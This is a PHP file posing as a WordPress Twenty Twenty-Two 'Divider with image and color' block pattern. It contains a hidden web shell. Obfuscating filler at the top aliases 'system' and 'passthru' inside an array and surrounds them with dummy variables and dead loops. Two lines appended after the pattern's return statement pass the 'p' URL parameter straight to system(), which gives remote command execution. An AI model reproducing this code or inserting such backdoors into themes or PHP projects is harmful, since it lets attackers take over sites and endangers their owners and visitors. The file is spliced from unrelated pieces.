<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Divider with image and color (light) block pattern
 */
return array(
	'title'      => __( 'Divider with image and color (light)', 'twentytwentytwo' ),
	'categories' => array( 'featured' ),
	'content'    => '<!-- wp:group {"align":"full","style":{"spacing":{"padding":{"top":"1rem","right":"0px","bottom":"1rem","left":"0px"}}},"backgroundColor":"secondary"} -->
					<div class="wp-block-group alignfull has-secondary-background-color has-background" style="padding-top:1rem;padding-right:0px;padding-bottom:1rem;padding-left:0px"><!-- wp:image {"id":473,"width":3001,"height":246,"sizeSlug":"full","linkDestination":"none"} -->
					<figure class="wp-block-image size-full is-resized"><img src="' . esc_url( get_template_directory_uri() ) . '/assets/images/divider-black.png" alt="" class="wp-image-473" width="3001" height="246"/></figure>
					<!-- /wp:image --></div>
					<!-- /wp:group -->',
);

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>